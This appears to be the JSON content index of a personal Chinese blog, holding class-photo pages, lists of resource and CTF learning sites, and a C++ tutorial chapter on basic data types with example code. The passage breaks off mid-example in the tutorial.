{"meta":{"title":"Uniqueland","subtitle":"--XsRan's Personal Blog","description":"","author":"XsRan","url":"http://uniqueland.top","root":"/"},"pages":[{"title":"来了","date":"2020-11-09T14:06:06.735Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/ToXiaowei.html","permalink":"http://uniqueland.top/Eastereggs/ToXiaowei.html","excerpt":"","text":"http://uniqueland.top/Eastereggs/Class17"},{"title":"Categories","date":"2020-05-10T05:33:34.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"categories/index.html","permalink":"http://uniqueland.top/categories/index.html","excerpt":"","text":""},{"title":"sitemap","date":"2020-05-10T05:34:11.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Sitemap/index.html","permalink":"http://uniqueland.top/Sitemap/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-05-10T05:33:14.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"about/index.html","permalink":"http://uniqueland.top/about/index.html","excerpt":"","text":"第一次搭建网站也不知道在“关于”版块写什么，就留个微信吧，有路过的想交个朋友的可以加微信交流一下。微信ID：KID3317"},{"title":"Schedule","date":"2020-05-10T05:33:53.000Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"schedule/index.html","permalink":"http://uniqueland.top/schedule/index.html","excerpt":"","text":""},{"title":"","date":"2021-04-24T14:21:13.884Z","updated":"2021-04-24T14:21:13.884Z","comments":true,"path":"hidden/resources.html","permalink":"http://uniqueland.top/hidden/resources.html","excerpt":"","text":"图片类 Wallhaven Pixabay Pngimg Pexels Unsplash Foodies 音效类 爱给网 字体类 字体天下 猫啃网 求字体 字由 100font 可商用字体查询 影视类 真不卡影视 独播库 91美剧网 色彩类 colorhunt Coolors Palettable PPT类 PPT宝藏 PPT超级市场 优品PPT 图标类 阿里巴巴矢量图标库 Iconstore 插画制作工具 视频类 Videezy Videvo Mixkit Distill 蓝光网 综合类 Anyknew Topbook"},{"title":"","date":"2022-03-26T11:52:57.162Z","updated":"2022-03-26T11:52:57.162Z","comments":true,"path":"hidden/ctf_resources.html","permalink":"http://uniqueland.top/hidden/ctf_resources.html","excerpt":"","text":"理论知识 CTFHUB 看雪知识库 CheatSheet CTF-WIKI 先知社区 安全客 洞悉漏洞 先知社区_XXE Freebuf_Web 实践平台 BUUCTF 攻防世界 Bugku 二进制_cy 综合 来自xPoint学长的分享"},{"title":"所有标签","date":"2021-11-07T15:49:01.532Z","updated":"2020-11-28T16:21:57.445Z","comments":true,"path":"tags/index.html","permalink":"http://uniqueland.top/tags/index.html","excerpt":"","text":""},{"title":"彩蛋","date":"2020-11-09T14:06:06.755Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Drafts/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Drafts/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) 由于展示图片较多，建议等待十秒再浏览，效果更佳。 镇楼 百日誓师 高二运动会 高三运动会 个人特写 彩蛋中的彩蛋 日常 高一 合照 待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog2020.05.25 首次部署2020.05.27 更换主题2020.05.28 部署过程出现错误，重装系统2020.06.01 贴图图床出现问题，更换图床2020.06.14 图床再次出现问题，使用微博作为临时图床，补充图片"},{"title":"彩蛋","date":"2020-11-10T03:26:46.695Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Class17.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Class17.html","excerpt":"","text":"FBI WARNING!非十七班同学请退出网页！(虽然说其他人也进不来) ,注意：此链接为内部链接，没有链接的人进不来，无需担心隐私泄漏。 镇楼百日誓师高二运动会高三运动会个人特写彩蛋中的彩蛋日常高一合照 关于个人照片如有因各种原因而不愿意展示图片的同学请与我联系如有想添加图片的同学也请与我联系，乐意至极待办事项收集毕业照打包图片，放链接征集网页文案制作子网……算了我好懒…终究还是逃不过制作子网页… 由于先前只有一个网页，故图片展示数量有限。现在…增加子网页的图片由于图床原因故待排版关于水印由于原先使用的图床出现了bug，导致部分图片加载错误，故不得不借用微博作为图床。关于图片整合包由于图片数量较多，故只挑选了一些较具有代表性的发布。后续会有网盘链接。变更记录changelog首次部署更换主题部署过程出现错误，重装系统贴图图床出现问题，更换图床图床再次出现问题，使用微博作为临时图床，补充图片由于图片过多，不得不分为数个子网页…图床再再再次出现问题，所有网页 推 倒 重 做再次排版添加图片，略作排版"},{"title":"彩蛋中的彩蛋","date":"2020-11-09T14:06:06.748Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Eastereggs.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Eastereggs.html","excerpt":"","text":"日常"},{"title":"个人特写","date":"2020-11-10T05:16:37.169Z","updated":"2020-11-10T05:16:37.168Z","comments":true,"path":"Eastereggs/Class17/Closeup.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Closeup.html","excerpt":"","text":"感谢高中有你们 (谁有珠姐和马老师的照片提供一下嘛…凑齐召唤神龙) 彩蛋中的彩蛋"},{"title":"高一","date":"2020-11-09T14:06:06.751Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade1.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade1.html","excerpt":"","text":"合照"},{"title":"高二运动会","date":"2020-11-09T14:06:06.743Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade2.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade2.html","excerpt":"","text":"!s 高三运动会"},{"title":"高三运动会","date":"2020-11-09T14:06:06.745Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Grade3.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Grade3.html","excerpt":"","text":"个人特写"},{"title":"日常","date":"2020-11-09T14:06:06.750Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Routine.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Routine.html","excerpt":"","text":"高一"},{"title":"镇楼","date":"2020-11-09T14:06:06.741Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Starting.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Starting.html","excerpt":"","text":"百日誓师"},{"title":"","date":"2020-11-10T02:28:15.625Z","updated":"2020-09-28T11:51:06.000Z","comments":true,"path":"Eastereggs/JNU2020/记暨大新训.html","permalink":"http://uniqueland.top/Eastereggs/JNU2020/%E8%AE%B0%E6%9A%A8%E5%A4%A7%E6%96%B0%E8%AE%AD.html","excerpt":"","text":"记暨大新训帅气昊哥在线演唱 随拍 在线征集文案…"},{"title":"成人礼 & 誓师","date":"2020-11-09T14:06:06.742Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Oath.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Oath.html","excerpt":"","text":"高二运动会"},{"title":"合照","date":"2020-11-10T05:15:55.270Z","updated":"2020-11-09T06:00:10.000Z","comments":true,"path":"Eastereggs/Class17/Groupphotos.html","permalink":"http://uniqueland.top/Eastereggs/Class17/Groupphotos.html","excerpt":"","text":"聚是一团火，散是满天星。十七班的各位兄弟姐妹们，我们有缘，江湖再见！ 返回"}],"posts":[{"title":"Chapter 3 处理数据","slug":"Cpp_tutorial_Chapter_3","date":"2025-04-26T12:03:35.410Z","updated":"2025-04-26T12:01:21.849Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_3/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_3/","excerpt":"","text":"3.1 简单变量在第2章中，我们已经接触了变量的声明和使用。本章将深入探讨C++的基本数据类型，首先从用于存储数字和字符的简单变量开始。简单变量是C++中存储数据的基本单元。 3.1.1 变量名变量名是赋予内存位置的标识符，用于访问存储在该位置的数据。在C++中，选择有意义的变量名是良好编程实践的一部分。 命名规则: 字符集: 变量名只能包含字母（大小写）、数字和下划线 _。 首字符: 名称的第一个字符不能是数字。 区分大小写: C++是大小写敏感的，myVariable 和 myvariable 是两个不同的变量名。 不能是关键字: 不能使用C++关键字（如 int, double, return, if, class 等）作为变量名。 长度限制: C++对名称的长度没有硬性规定，但长名称可能会在某些旧编译器或链接器上遇到问题。通常，有意义且不过于冗长的名称是最好的。 下划线的使用: 以两个下划线 __ 开头或以下划线和大写字母 _A 到 _Z 开头的名称被保留给编译器及其使用的资源使用。 以下划线 _ 开头的名称被保留用作全局标识符。 虽然在某些情况下可以使用以下划线开头的名称（例如在函数内部），但最好避免这种用法，以防与系统使用的名称冲突。 命名约定 (非强制，但推荐): 有意义: 变量名应反映其存储的数据或用途（例如 numberOfStudents, userName, totalScore）。 驼峰命名法 (Camel Case): 从第二个单词开始，每个单词的首字母大写（例如 myVariableName, studentAge）。这是C++中常见的风格。 下划线分隔 (Snake Case): 使用下划线分隔单词（例如 my_variable_name, student_age）。这也是一种常见的风格。 选择一种风格并保持一致。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // 合法的变量名 int age; double accountBalance; char first_initial; long long populationOfEarth; int _internal_counter; // 合法，但不推荐在全局使用 int value2; // 非法的变量名 // int 1stPlace; // 不能以数字开头 // double account Balance; // 不能包含空格 // int return; // 不能是关键字 // char my-char; // 不能包含连字符 &#x27;-&#x27; // 区分大小写 int count = 10; int Count = 20; std::cout &lt;&lt; &quot;count: &quot; &lt;&lt; count &lt;&lt; std::endl; // 输出 10 std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; Count &lt;&lt; std::endl; // 输出 20 return 0;&#125; 3.1.2 整型整型 (Integer) 是没有小数部分的数字。C++提供了多种整型类型来存储整数，它们的主要区别在于占用的内存空间大小以及能够表示的数值范围。 计算机内存由称为位 (bit) 的单元组成。8个位组成一个**字节 (byte)**。每个位可以表示两种状态（通常是0或1）。字节是内存中最小的可寻址单元，意味着每个字节都有一个唯一的地址。 不同的整型类型使用不同数量的字节来存储值。使用的字节数越多，可以表示的整数范围就越大。 基本整型类型: short int long long long (C++11 新增) 我们将在下一节详细讨论这些类型。 用法与示例: 12345678910111213141516171819202122#include &lt;iostream&gt;int main() &#123; // 声明不同类型的整型变量 short smallNumber; int standardInteger; long largeInteger; long long veryLargeInteger; // 需要 C++11 或更高版本 // 赋值 smallNumber = 10; standardInteger = 10000; largeInteger = 1000000; veryLargeInteger = 10000000000LL; // LL 后缀表示 long long std::cout &lt;&lt; &quot;short: &quot; &lt;&lt; smallNumber &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int: &quot; &lt;&lt; standardInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long: &quot; &lt;&lt; largeInteger &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long: &quot; &lt;&lt; veryLargeInteger &lt;&lt; std::endl; return 0;&#125; 3.1.3 整型short、int、long和long longC++标准规定了各种整型类型的最小尺寸（占用的内存位数），但具体尺寸可能因编译器和操作系统而异。 标准规定的最小尺寸: short: 至少16位。 int: 至少和 short 一样大，通常是系统处理效率最高的整数长度（例如，在32位系统上通常是32位，64位系统上可能是32位或64位）。 long: 至少32位，且至少和 int 一样大。 long long: 至少64位，且至少和 long 一样大。 如何查看具体尺寸: 可以使用 sizeof 运算符来查看特定类型在你的系统上占用的字节数。 用法与示例: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;climits&gt; // 包含整型限制信息 (如 INT_MAX)int main() &#123; // 使用 sizeof 查看各种类型占用的字节数 std::cout &lt;&lt; &quot;Size of short: &quot; &lt;&lt; sizeof(short) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of int: &quot; &lt;&lt; sizeof(int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long: &quot; &lt;&lt; sizeof(long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long long: &quot; &lt;&lt; sizeof(long long) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 查看 int 类型的最大值 (需要 &lt;climits&gt;) std::cout &lt;&lt; &quot;Maximum value for int: &quot; &lt;&lt; INT_MAX &lt;&lt; std::endl; // 类似地，有 SHRT_MAX, LONG_MAX, LLONG_MAX 等 // 声明和初始化 short s_value = 32767; // 通常是 short 的最大值 (如果 short 是 16 位) int i_value = 2000000000; long l_value = 1000000000L; // L 后缀表示 long (可选，但有时有助于清晰) long long ll_value = 50000000000LL; // LL 后缀表示 long long std::cout &lt;&lt; &quot;short value: &quot; &lt;&lt; s_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;int value: &quot; &lt;&lt; i_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long value: &quot; &lt;&lt; l_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long long value: &quot; &lt;&lt; ll_value &lt;&lt; std::endl; // 溢出示例 (行为是未定义的或回绕) short max_short = SHRT_MAX; std::cout &lt;&lt; &quot;Max short: &quot; &lt;&lt; max_short &lt;&lt; std::endl; max_short = max_short + 1; // 尝试超出最大值 std::cout &lt;&lt; &quot;Max short + 1: &quot; &lt;&lt; max_short &lt;&lt; std::endl; // 可能变成负数 return 0;&#125; 注意: 当一个整数值超出了其类型所能表示的最大范围时，会发生溢出 (Overflow)**。对于有符号整数溢出，C++标准规定其行为是未定义的 (Undefined Behavior)**，这意味着任何事情都可能发生（程序崩溃、得到奇怪的结果等）。对于无符号整数溢出，行为是定义好的（通常是回绕，即从0重新开始）。 3.1.4 无符号类型对于每种整型（short, int, long, long long），都存在一个对应的无符号 (unsigned) 版本。无符号类型只能存储非负整数（0和正数）。 通过在类型名前加上 unsigned 关键字来声明无符号类型。 特点: 范围: 在相同的字节数下，无符号类型可以表示的最大值大约是有符号类型的两倍，因为它们不需要用一位来表示正负号。范围从 0 开始。 用途: 当你知道一个变量永远不会是负数时（例如，计数器、数组索引、人口数量等），使用无符号类型可以增大其可表示的正数范围。 回绕 (Wrap Around): 当无符号整数的值超出其最大范围时，它会从0重新开始（模运算）。例如，如果一个 unsigned short 的最大值是 65535，那么 65535 + 1 会变成 0。同样，0 - 1 会变成 65535。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;climits&gt; // 包含 UINT_MAX 等int main() &#123; // 声明无符号类型 unsigned short us_value; unsigned int ui_value; unsigned long ul_value; unsigned long long ull_value; // 查看大小和范围 std::cout &lt;&lt; &quot;Size of unsigned int: &quot; &lt;&lt; sizeof(unsigned int) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Maximum value for unsigned int: &quot; &lt;&lt; UINT_MAX &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 赋值 us_value = 65535; // 通常是 unsigned short 的最大值 (如果 short 是 16 位) ui_value = 4000000000U; // U 后缀表示 unsigned int ul_value = 8000000000UL; // UL 后缀 ull_value = 18000000000000000000ULL; // ULL 后缀 std::cout &lt;&lt; &quot;unsigned short: &quot; &lt;&lt; us_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned int: &quot; &lt;&lt; ui_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long: &quot; &lt;&lt; ul_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;unsigned long long: &quot; &lt;&lt; ull_value &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 回绕示例 unsigned short test_wrap = USHRT_MAX; std::cout &lt;&lt; &quot;Max unsigned short: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; test_wrap = test_wrap + 1; std::cout &lt;&lt; &quot;Max unsigned short + 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // 变为 0 test_wrap = 0; std::cout &lt;&lt; &quot;Unsigned short = 0&quot; &lt;&lt; std::endl; test_wrap = test_wrap - 1; std::cout &lt;&lt; &quot;Unsigned short - 1: &quot; &lt;&lt; test_wrap &lt;&lt; std::endl; // 变为 USHRT_MAX return 0;&#125; 注意: 混合使用有符号和无符号整数进行运算时要特别小心，因为有符号数可能会被隐式转换为无符号数，导致意外的结果，尤其是在比较运算中。 3.1.5 选择整型类型在选择使用哪种整型类型时，应考虑以下因素： 数值范围: 确保所选类型能够容纳你程序中需要存储的最大（和最小，如果是有符号）整数值。如果数值可能很大，优先考虑 long 或 long long。如果数值永远非负，可以考虑 unsigned 版本以获得更大的正数范围。 内存消耗: 如果内存非常宝贵（例如在嵌入式系统或处理大量数据时），并且确定数值范围较小，可以使用 short 来节省内存。 性能: int 通常被认为是计算机处理效率最高的整数类型。除非有明确的范围或内存需求，否则 int 是一个不错的默认选择。 可移植性: int 的大小可能因系统而异。如果需要确保在不同系统上具有固定的大小，可以使用 C++11 引入的固定宽度整数类型（在 &lt;cstdint&gt; 头文件中定义），例如 int16_t, uint32_t, int64_t 等。 代码清晰度: 选择最能自然表达意图的类型。如果变量代表一个永远不会为负的计数，unsigned int 可能比 int 更能表达这个意图。 一般建议: 如果不需要存储负数，且需要更大的正数范围，或者变量逻辑上就是无符号的（如计数），使用 unsigned。 如果数值范围不大，且没有特殊内存或性能要求，int 是最常用的选择。 如果 int 可能不够大，使用 long long。long 在某些系统上可能和 int 大小相同，而 long long 保证至少64位。 只有在内存非常受限且确定数值很小时才使用 short。 为了明确性和跨平台兼容性，可以考虑使用 &lt;cstdint&gt; 中的固定宽度类型。 用法与示例 (选择): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;cstdint&gt; // 包含固定宽度整数类型int main() &#123; // 场景 1: 存储学生年龄 (通常不大，非负) unsigned int studentAge = 20; // unsigned int 或 int 都可以，unsigned 更明确非负 // 场景 2: 循环计数器 (通常用 int) for (int i = 0; i &lt; 10; ++i) &#123; // ... &#125; // 场景 3: 存储文件大小 (可能非常大，非负) unsigned long long fileSize = 5000000000ULL; // 需要大范围，非负 // 场景 4: 需要精确 32 位有符号整数 (跨平台) int32_t preciseCounter = -123456789; // 场景 5: 内存受限，存储少量选项 (0-100) // short optionCode = 5; // 如果 short 足够且内存关键 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; studentAge &lt;&lt; std::endl; std::cout &lt;&lt; &quot;File Size: &quot; &lt;&lt; fileSize &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Precise Counter: &quot; &lt;&lt; preciseCounter &lt;&lt; std::endl; return 0;&#125; 3.1.6 整型字面值整型字面值 (Integer Literal) 是直接写在代码中的整数常量，例如 10, 0, -5, 42。C++允许以不同的进制（基数）书写整型字面值： 十进制 (Decimal): 最常见的形式，以非零数字开头（除非是数字0本身）。例如：10, 255, 0, 12345。 八进制 (Octal): 以 0 开头。只包含数字 0-7。例如：012 (等于十进制的 10)，077 (等于十进制的 63)。现代C++中应谨慎使用，容易与十进制混淆。 十六进制 (Hexadecimal): 以 0x 或 0X 开头。包含数字 0-9 和字母 a-f (或 A-F)，大小写不敏感。例如：0xA (等于十进制的 10)，0xFF (等于十进制的 255)，0x1a2b。常用于表示内存地址或位模式。 二进制 (Binary) (C++14): 以 0b 或 0B 开头。只包含数字 0 和 1。例如：0b1010 (等于十进制的 10)，0b11111111 (等于十进制的 255)。 后缀 (Suffixes): 可以通过在字面值后面添加后缀来显式指定其类型： u 或 U: 表示 unsigned 类型 (unsigned int, unsigned long, unsigned long long)。 l 或 L: 表示 long 或 unsigned long 类型。 ll 或 LL: 表示 long long 或 unsigned long long 类型 (C++11)。 后缀可以组合使用，例如 ul, UL, ull, ULL, lu, llu 等（顺序和大小写不重要）。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int decimal_val = 100; int octal_val = 0144; // 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (十进制) int hex_val = 0x64; // 6*16 + 4*1 = 96 + 4 = 100 (十进制) // int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (十进制) std::cout &lt;&lt; &quot;Decimal: &quot; &lt;&lt; decimal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Octal (0144): &quot; &lt;&lt; octal_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hexadecimal (0x64): &quot; &lt;&lt; hex_val &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // 需要 C++14 编译器 // 使用后缀 unsigned int u_val = 100U; long l_val = 200000L; unsigned long ul_val = 300000UL; long long ll_val = 4000000000LL; unsigned long long ull_val = 5000000000ULL; std::cout &lt;&lt; &quot;Unsigned int: &quot; &lt;&lt; u_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long: &quot; &lt;&lt; l_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long: &quot; &lt;&lt; ul_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Long long: &quot; &lt;&lt; ll_val &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Unsigned long long: &quot; &lt;&lt; ull_val &lt;&lt; std::endl; return 0;&#125; 3.1.7 C++如何确定常量的类型当你写下一个整型字面值（常量）而没有指定后缀时，C++编译器会根据其值来推断其类型。 规则: 十进制常量: 编译器会选择能容纳该值的最小的有符号类型，依次尝试：int, long, long long (C++11)。例如： 100 会被认为是 int (如果 int 能容纳)。 3000000000 会被认为是 long (如果 int 不能容纳但 long 可以)，或者 long long (如果 int 和 long 都不能容纳但 long long 可以)。 八进制或十六进制常量: 编译器会选择能容纳该值的最小类型，依次尝试：int, unsigned int, long, unsigned long, long long (C++11), unsigned long long (C++11)。注意这里包含了 unsigned 类型。 为什么要知道这个? 这在涉及类型转换和函数重载时可能很重要。如果你传递一个常量给函数，它的默认类型可能会影响哪个重载版本被调用。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)void process(int n) &#123; std::cout &lt;&lt; &quot;Processing int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned int n) &#123; std::cout &lt;&lt; &quot;Processing unsigned int: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long n) &#123; std::cout &lt;&lt; &quot;Processing long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long n) &#123; std::cout &lt;&lt; &quot;Processing unsigned long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;void process(unsigned long long n) &#123; // C++11 std::cout &lt;&lt; &quot;Processing unsigned long long: &quot; &lt;&lt; n &lt;&lt; std::endl;&#125;int main() &#123; std::cout &lt;&lt; &quot;Type of 100: &quot;; process(100); // 通常调用 process(int) // 假设 int 是 32 位，最大值约 21 亿 std::cout &lt;&lt; &quot;Type of 3000000000: &quot;; // 如果 int 是 32 位，这个值超出了 int 范围 // 编译器会尝试 long 或 long long process(3000000000); // 可能调用 process(long) 或 process(long long) std::cout &lt;&lt; &quot;Type of 0xFFFFFFFF: &quot;; // 这个十六进制数 (等于 4294967295) // 如果 int 是 32 位，它超出了有符号 int 的范围 // 编译器会尝试 unsigned int, long, unsigned long... process(0xFFFFFFFF); // 可能调用 process(unsigned int) 或 process(unsigned long)等 // 使用后缀明确类型 std::cout &lt;&lt; &quot;Type of 150L: &quot;; process(150L); // 明确调用 process(long) std::cout &lt;&lt; &quot;Type of 200U: &quot;; process(200U); // 明确调用 process(unsigned int) std::cout &lt;&lt; &quot;Type of 5000000000LL: &quot;; process(5000000000LL); // 明确调用 process(long long) return 0;&#125; 关键点: 如果不确定常量会被推断成什么类型，或者想要确保它是特定类型，最好使用后缀。 3.1.8 char类型：字符和小整数char 类型是另一种整型类型，它被设计用来存储**字符 (character)**，例如字母、数字、标点符号等。 特点: 大小: char 通常占用 1 个字节（8位）的内存。这是C++标准保证的 (sizeof(char) 总是 1)。 字符表示: 计算机内部使用数值编码（如 ASCII 或 Unicode 的子集）来表示字符。char 变量存储的是这些字符对应的整数编码。 字符字面值: 使用单引号 &#39; &#39; 括起来表示单个字符字面值，例如 &#39;A&#39;, &#39;a&#39;, &#39;5&#39;, &#39;?&#39;, &#39;\\n&#39; (换行符)。 整数类型: char 本质上仍然是一个整数类型。它可以参与算术运算。 有符号 vs 无符号: char 类型具体是有符号 (signed char) 还是无符号 (unsigned char) 取决于编译器实现。如果你需要明确，可以直接使用 signed char 或 unsigned char。 signed char: 范围通常是 -128 到 127。 unsigned char: 范围通常是 0 到 255。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; char grade = &#x27;A&#x27;; // 存储字符 &#x27;A&#x27; char initial = &#x27;J&#x27;; char symbol = &#x27;$&#x27;; char newline = &#x27;\\n&#x27;; // 存储换行符 (转义序列) std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Symbol: &quot; &lt;&lt; symbol &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Printing a newline:&quot; &lt;&lt; newline; // 输出一个换行 std::cout &lt;&lt; &quot;After newline.&quot; &lt;&lt; std::endl; // cout 会将 char 类型解释为字符进行打印 // 如果想看到字符对应的整数编码，需要进行类型转换 std::cout &lt;&lt; &quot;The integer code for &#x27;A&#x27; is: &quot; &lt;&lt; int(grade) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;The integer code for &#x27;$&#x27; is: &quot; &lt;&lt; static_cast&lt;int&gt;(symbol) &lt;&lt; std::endl; // char 作为小整数使用 char small_num = 65; // 65 是 ASCII 码中 &#x27;A&#x27; 的值 std::cout &lt;&lt; &quot;Character with code 65: &quot; &lt;&lt; small_num &lt;&lt; std::endl; // 输出 &#x27;A&#x27; // 算术运算 char next_char = grade + 1; // &#x27;A&#x27; 的编码加 1 得到 &#x27;B&#x27; 的编码 std::cout &lt;&lt; &quot;Character after &#x27;A&#x27;: &quot; &lt;&lt; next_char &lt;&lt; std::endl; // 输出 &#x27;B&#x27; // 输入字符 char response; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; response; // 读取一个字符 std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; response &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Its code is: &quot; &lt;&lt; int(response) &lt;&lt; std::endl; // 明确使用 signed/unsigned char signed char sc = -5; unsigned char uc = 250; std::cout &lt;&lt; &quot;Signed char: &quot; &lt;&lt; int(sc) &lt;&lt; std::endl; // 转换为 int 打印数值 std::cout &lt;&lt; &quot;Unsigned char: &quot; &lt;&lt; int(uc) &lt;&lt; std::endl; return 0;&#125; 转义序列 (Escape Sequence):以反斜杠 \\ 开头的特殊字符序列，用于表示无法直接输入的字符或具有特殊含义的字符。常用转义序列包括： \\n: 换行符 \\t: 水平制表符 (Tab) \\r: 回车符 \\\\: 反斜杠本身 \\&#39;: 单引号 \\&quot;: 双引号 \\?: 问号 \\0: 空字符 (Null character) \\xhh: 用两位十六进制数 hh 表示字符 \\ooo: 用最多三位八进制数 ooo 表示字符 3.1.9 bool类型bool 类型是C++中的布尔 (Boolean) 类型，用于表示逻辑值：真 (true) 或 **假 (false)**。 特点: 取值: bool 变量只能存储两个值：true 和 false。这两个是C++关键字。 整数转换: 在需要整数的地方，true 会被转换为 1，false 会被转换为 0。 在需要布尔值的地方，任何非零整数值会被转换为 true，零值会被转换为 false。指针类型也可以转换为 bool（空指针为 false，非空指针为 true）。 大小: bool 类型的大小没有严格规定，但通常是 1 个字节，即使它只需要 1 位来存储信息。 用途: 主要用于存储条件判断（如 if 语句、循环条件）的结果。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;int main() &#123; bool isReady = true; // 声明并初始化为 true bool hasError = false; // 声明并初始化为 false bool isEmpty; // 未初始化 (值不确定) isEmpty = false; // 赋值 std::cout &lt;&lt; &quot;isReady (default output): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // 通常输出 1 std::cout &lt;&lt; &quot;hasError (default output): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // 通常输出 0 std::cout &lt;&lt; &quot;isEmpty (default output): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // 输出 0 // 使用 std::boolalpha 控制符以 &quot;true&quot;/&quot;false&quot; 形式输出 std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;isReady (boolalpha): &quot; &lt;&lt; isReady &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;hasError (boolalpha): &quot; &lt;&lt; hasError &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; &quot;isEmpty (boolalpha): &quot; &lt;&lt; isEmpty &lt;&lt; std::endl; // 输出 false std::cout &lt;&lt; std::noboolalpha; // 关闭 boolalpha 格式 // bool 和整数转换 int ready_int = isReady; // ready_int 变为 1 int error_int = hasError; // error_int 变为 0 std::cout &lt;&lt; &quot;isReady as int: &quot; &lt;&lt; ready_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;hasError as int: &quot; &lt;&lt; error_int &lt;&lt; std::endl; bool from_int_non_zero = 100; // 100 